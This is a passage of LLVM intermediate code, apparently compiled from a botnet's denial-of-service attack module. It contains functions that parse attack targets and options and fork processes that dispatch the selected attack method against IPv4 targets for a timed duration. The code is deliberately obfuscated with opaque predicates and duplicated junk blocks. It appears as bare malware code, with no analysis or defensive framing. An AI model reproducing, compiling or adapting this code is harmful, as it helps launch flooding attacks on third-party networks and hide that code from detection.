  %194 = icmp ult i64 %193, 1
  br i1 %194, label %195, label %196

; <label>:195:                                    ; preds = %191
  br label %299

; <label>:196:                                    ; preds = %191
  %197 = load i8*, i8** %3, align 8
  %198 = getelementptr inbounds i8, i8* %197, i32 1
  store i8* %198, i8** %3, align 8
  %199 = load i8, i8* %197, align 1
  %200 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %201 = load i32, i32* %5, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %200, i64 %202
  %204 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %203, i32 0, i32 1
  store i8 %199, i8* %204, align 8
  %205 = load i32, i32* %4, align 4
  %206 = sext i32 %205 to i64
  %207 = sub i64 %206, 1
  %208 = trunc i64 %207 to i32
  store i32 %208, i32* %4, align 4
  %209 = load i32, i32* %4, align 4
  %210 = sext i32 %209 to i64
  %211 = icmp ult i64 %210, 1
  br i1 %211, label %212, label %213

; <label>:212:                                    ; preds = %196
  br label %299

; <label>:213:                                    ; preds = %196
  %214 = load i8*, i8** %3, align 8
  %215 = getelementptr inbounds i8, i8* %214, i32 1
  store i8* %215, i8** %3, align 8
  %216 = load i8, i8* %214, align 1
  store i8 %216, i8* %12, align 1
  %217 = load i32, i32* %4, align 4
  %218 = sext i32 %217 to i64
  %219 = sub i64 %218, 1
  %220 = trunc i64 %219 to i32
  store i32 %220, i32* %4, align 4
  %221 = load i32, i32* %4, align 4
  %222 = load i8, i8* %12, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp slt i32 %221, %223
  br i1 %224, label %225, label %242

; <label>:225:                                    ; preds = %213
  %226 = load i32, i32* @x.7
  %227 = load i32, i32* @y.8
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %225
  %234 = load i32, i32* @x.7
  %235 = load i32, i32* @y.8
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br label %299

; <label>:242:                                    ; preds = %213
  %243 = load i8, i8* %12, align 1
  %244 = zext i8 %243 to i32
  %245 = add nsw i32 %244, 1
  %246 = sext i32 %245 to i64
  %247 = call noalias i8* @calloc(i64 %246, i64 1) #6
  %248 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %249 = load i32, i32* %5, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %248, i64 %250
  %252 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %251, i32 0, i32 0
  store i8* %247, i8** %252, align 8
  %253 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %254 = load i32, i32* %5, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %253, i64 %255
  %257 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %256, i32 0, i32 0
  %258 = load i8*, i8** %257, align 8
  %259 = load i8*, i8** %3, align 8
  %260 = load i8, i8* %12, align 1
  %261 = zext i8 %260 to i32
  call void @util_memcpy(i8* %258, i8* %259, i32 %261)
  %262 = load i8, i8* %12, align 1
  %263 = zext i8 %262 to i32
  %264 = load i8*, i8** %3, align 8
  %265 = sext i32 %263 to i64
  %266 = getelementptr inbounds i8, i8* %264, i64 %265
  store i8* %266, i8** %3, align 8
  %267 = load i8, i8* %12, align 1
  %268 = zext i8 %267 to i32
  %269 = load i32, i32* %4, align 4
  %270 = sub nsw i32 %269, %268
  store i32 %270, i32* %4, align 4
  br label %271

; <label>:271:                                    ; preds = %242
  %272 = load i32, i32* %5, align 4
  %273 = add nsw i32 %272, 1
  store i32 %273, i32* %5, align 4
  br label %186

; <label>:274:                                    ; preds = %186
  %275 = load i32, i32* @x.7
  %276 = load i32, i32* @y.8
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %274
  %283 = load i32, i32* @x.7
  %284 = load i32, i32* @y.8
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %291

; <label>:291:                                    ; preds = %originalBBpart238, %170
  %292 = call i32* @__errno_location() #7
  store i32 0, i32* %292, align 4
  %293 = load i32, i32* %6, align 4
  %294 = load i8, i8* %7, align 1
  %295 = load i8, i8* %8, align 1
  %296 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %297 = load i8, i8* %9, align 1
  %298 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %293, i8 zeroext %294, i8 zeroext %295, %struct.attack_target* %296, i8 zeroext %297, %struct.attack_option* %298)
  br label %299

; <label>:299:                                    ; preds = %291, %originalBBpart234, %212, %195, %169, %93, %85, %originalBBpart2, %30, %16
  %300 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %301 = icmp ne %struct.attack_target* %300, null
  br i1 %301, label %302, label %305

; <label>:302:                                    ; preds = %299
  %303 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %304 = bitcast %struct.attack_target* %303 to i8*
  call void @free(i8* %304) #6
  br label %305

; <label>:305:                                    ; preds = %302, %299
  %306 = load i32, i32* @x.7
  %307 = load i32, i32* @y.8
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %305
  %314 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %315 = icmp ne %struct.attack_option* %314, null
  %316 = load i32, i32* @x.7
  %317 = load i32, i32* @y.8
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %315, label %324, label %328

; <label>:324:                                    ; preds = %originalBBpart242
  %325 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %326 = load i8, i8* %9, align 1
  %327 = zext i8 %326 to i32
  call void @free_opts(%struct.attack_option* %325, i32 %327)
  br label %328

; <label>:328:                                    ; preds = %324, %originalBBpart242
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %41
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  %329 = load i8*, i8** %3, align 8
  %330 = getelementptr inbounds i8, i8* %329, i32 1
  store i8* %330, i8** %3, align 8
  %331 = load i8, i8* %329, align 1
  store i8 %331, i8* %8, align 1
  %332 = load i32, i32* %4, align 4
  %333 = sext i32 %332 to i64
  %_ = sub i64 0, %333
  %gen = add i64 %_, 1
  %_2 = shl i64 %333, 1
  %_3 = sub i64 0, %333
  %gen4 = add i64 %_3, 1
  %_5 = sub i64 0, %333
  %gen6 = add i64 %_5, 1
  %_7 = sub i64 %333, 1
  %gen8 = mul i64 %_7, 1
  %334 = sub i64 %333, 1
  %335 = trunc i64 %334 to i32
  store i32 %335, i32* %4, align 4
  %336 = load i8, i8* %8, align 1
  %337 = zext i8 %336 to i32
  %338 = icmp eq i32 %337, 0
  br label %originalBB1

originalBB12alteredBB:                            ; preds = %originalBB12, %104
  %339 = load i8*, i8** %3, align 8
  %340 = bitcast i8* %339 to i32*
  %341 = load i32, i32* %340, align 4
  %342 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %343 = load i32, i32* %5, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %342, i64 %344
  %346 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %345, i32 0, i32 1
  store i32 %341, i32* %346, align 4
  %347 = load i8*, i8** %3, align 8
  %348 = getelementptr inbounds i8, i8* %347, i64 4
  store i8* %348, i8** %3, align 8
  %349 = load i8*, i8** %3, align 8
  %350 = getelementptr inbounds i8, i8* %349, i32 1
  store i8* %350, i8** %3, align 8
  %351 = load i8, i8* %349, align 1
  %352 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %353 = load i32, i32* %5, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %355, i32 0, i32 2
  store i8 %351, i8* %356, align 4
  %357 = load i32, i32* %4, align 4
  %358 = sext i32 %357 to i64
  %_13 = sub i64 %358, 5
  %gen14 = mul i64 %_13, 5
  %_15 = sub i64 %358, 5
  %gen16 = mul i64 %_15, 5
  %_17 = shl i64 %358, 5
  %_18 = sub i64 0, %358
  %gen19 = add i64 %_18, 5
  %_20 = shl i64 %358, 5
  %_21 = sub i64 0, %358
  %gen22 = add i64 %_21, 5
  %_23 = sub i64 0, %358
  %gen24 = add i64 %_23, 5
  %_25 = sub i64 %358, 5
  %gen26 = mul i64 %_25, 5
  %_27 = sub i64 %358, 5
  %gen28 = mul i64 %_27, 5
  %359 = sub i64 %358, 5
  %360 = trunc i64 %359 to i32
  store i32 %360, i32* %4, align 4
  %361 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %362 = load i32, i32* %5, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %361, i64 %363
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %364, i32 0, i32 0
  %366 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %365, i32 0, i32 0
  store i16 2, i16* %366, align 4
  %367 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %368 = load i32, i32* %5, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i64 %369
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i32 0, i32 1
  %372 = load i32, i32* %371, align 4
  %373 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %374 = load i32, i32* %5, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i32 0, i32 0
  %378 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %377, i32 0, i32 2
  %379 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %378, i32 0, i32 0
  store i32 %372, i32* %379, align 4
  br label %originalBB12

originalBB32alteredBB:                            ; preds = %originalBB32, %225
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %274
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %305
  %380 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %381 = icmp ne %struct.attack_option* %380, null
  br label %originalBB40
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %38, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* @x.9
  %21 = load i32, i32* @y.10
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %13, align 4
  %29 = icmp sgt i32 %28, 0
  %30 = load i32, i32* @x.9
  %31 = load i32, i32* @y.10
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %39

; <label>:38:                                     ; preds = %originalBBpart2, %6
  ret void

; <label>:39:                                     ; preds = %originalBBpart2
  %40 = call i32 @fork() #6
  store i32 %40, i32* %14, align 4
  %41 = load i32, i32* %14, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %39
  call void @exit(i32 0) #8
  unreachable

; <label>:44:                                     ; preds = %39
  %45 = load i32, i32* @x.9
  %46 = load i32, i32* @y.10
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %44
  %53 = load i32, i32* %14, align 4
  %54 = icmp eq i32 %53, 0
  %55 = load i32, i32* @x.9
  %56 = load i32, i32* @y.10
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %54, label %63, label %68

; <label>:63:                                     ; preds = %originalBBpart24
  %64 = load i32, i32* %7, align 4
  %65 = call i32 @sleep(i32 %64)
  %66 = call i32 @getppid() #6
  %67 = call i32 @kill(i32 %66, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:68:                                     ; preds = %originalBBpart24
  store i32 0, i32* %15, align 4
  br label %69

; <label>:69:                                     ; preds = %131, %68
  %70 = load i32, i32* @x.9
  %71 = load i32, i32* @y.10
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %69
  %78 = load i32, i32* %15, align 4
  %79 = load i8, i8* @methods_len, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp slt i32 %78, %80
  %82 = load i32, i32* @x.9
  %83 = load i32, i32* @y.10
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %81, label %90, label %134

; <label>:90:                                     ; preds = %originalBBpart28
  %91 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %92 = load i32, i32* %15, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %91, i64 %93
  %95 = load %struct.attack_method*, %struct.attack_method** %94, align 8
  %96 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %95, i32 0, i32 1
  %97 = load i8, i8* %96, align 8
  %98 = zext i8 %97 to i32
  %99 = load i8, i8* %8, align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %98, %100
  br i1 %101, label %102, label %130

; <label>:102:                                    ; preds = %90
  %103 = load i32, i32* @x.9
  %104 = load i32, i32* @y.10
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %102
  %111 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %112 = load i32, i32* %15, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %111, i64 %113
  %115 = load %struct.attack_method*, %struct.attack_method** %114, align 8
  %116 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %115, i32 0, i32 0
  %117 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %116, align 8
  %118 = load i8, i8* %9, align 1
  %119 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %120 = load i8, i8* %11, align 1
  %121 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %117(i8 zeroext %118, %struct.attack_target* %119, i8 zeroext %120, %struct.attack_option* %121)
  %122 = load i32, i32* @x.9
  %123 = load i32, i32* @y.10
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %134

; <label>:130:                                    ; preds = %90
  br label %131

; <label>:131:                                    ; preds = %130
  %132 = load i32, i32* %15, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %15, align 4
  br label %69

; <label>:134:                                    ; preds = %originalBBpart212, %originalBBpart28
  %135 = load i32, i32* @x.9
  %136 = load i32, i32* @y.10
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %134
  call void @exit(i32 0) #8
  %143 = load i32, i32* @x.9
  %144 = load i32, i32* @y.10
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %19
  %151 = load i32, i32* %13, align 4
  %152 = icmp sgt i32 %151, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %44
  %153 = load i32, i32* %14, align 4
  %154 = icmp eq i32 %153, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %69
  %155 = load i32, i32* %15, align 4
  %156 = load i8, i8* @methods_len, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp slt i32 %155, %157
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %102
  %159 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %160 = load i32, i32* %15, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %159, i64 %161
  %163 = load %struct.attack_method*, %struct.attack_method** %162, align 8
  %164 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %163, i32 0, i32 0
  %165 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %164, align 8
  %166 = load i8, i8* %9, align 1
  %167 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %168 = load i8, i8* %11, align 1
  %169 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %165(i8 zeroext %166, %struct.attack_target* %167, i8 zeroext %168, %struct.attack_option* %169)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %134
  call void @exit(i32 0) #8
  br label %originalBB14
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = load i32, i32* @x.11
  %4 = load i32, i32* @y.12
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %11, align 8
  store i32 %1, i32* %12, align 4
  %14 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %15 = icmp eq %struct.attack_option* %14, null
  %16 = load i32, i32* @x.11
  %17 = load i32, i32* @y.12
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %25

; <label>:24:                                     ; preds = %originalBBpart2
  br label %68

; <label>:25:                                     ; preds = %originalBBpart2
  store i32 0, i32* %13, align 4
  br label %26

; <label>:26:                                     ; preds = %62, %25
  %27 = load i32, i32* %13, align 4
  %28 = load i32, i32* %12, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %65

; <label>:30:                                     ; preds = %26
  %31 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %32 = load i32, i32* %13, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i64 %33
  %35 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  %37 = icmp ne i8* %36, null
  br i1 %37, label %38, label %61

; <label>:38:                                     ; preds = %30
  %39 = load i32, i32* @x.11
  %40 = load i32, i32* @y.12
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %48 = load i32, i32* %13, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %47, i64 %49
  %51 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  call void @free(i8* %52) #6
  %53 = load i32, i32* @x.11
  %54 = load i32, i32* @y.12
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %61

; <label>:61:                                     ; preds = %originalBBpart24, %30
  br label %62

; <label>:62:                                     ; preds = %61
  %63 = load i32, i32* %13, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %13, align 4
  br label %26

; <label>:65:                                     ; preds = %26
  %66 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %67 = bitcast %struct.attack_option* %66 to i8*
  call void @free(i8* %67) #6
  br label %68

; <label>:68:                                     ; preds = %65, %24
  %69 = load i32, i32* @x.11
  %70 = load i32, i32* @y.12
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i32, i32* @x.11
  %78 = load i32, i32* @y.12
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %85 = alloca %struct.attack_option*, align 8
  %86 = alloca i32, align 4
  %87 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %85, align 8
  store i32 %1, i32* %86, align 4
  %88 = load %struct.attack_option*, %struct.attack_option** %85, align 8
  %89 = icmp eq %struct.attack_option* %88, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %90 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %90, i64 %92
  %94 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %93, i32 0, i32 0
  %95 = load i8*, i8** %94, align 8
  call void @free(i8* %95) #6
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #3

declare i32 @sleep(i32) #4

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %67, %4
  %12 = load i32, i32* @x.13
  %13 = load i32, i32* @y.14
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %10, align 4
  %21 = load i8, i8* %6, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp slt i32 %20, %22
  %24 = load i32, i32* @x.13
  %25 = load i32, i32* @y.14
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %70

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %34 = load i32, i32* %10, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %33, i64 %35
  %37 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %36, i32 0, i32 1
  %38 = load i8, i8* %37, align 8
  %39 = zext i8 %38 to i32
  %40 = load i8, i8* %8, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %39, %41
  br i1 %42, label %43, label %50

; <label>:43:                                     ; preds = %32
  %44 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %45 = load i32, i32* %10, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %44, i64 %46
  %48 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %47, i32 0, i32 0
  %49 = load i8*, i8** %48, align 8
  store i8* %49, i8** %5, align 8
  br label %88

; <label>:50:                                     ; preds = %32
  %51 = load i32, i32* @x.13
  %52 = load i32, i32* @y.14
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = load i32, i32* @x.13
  %60 = load i32, i32* @y.14
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
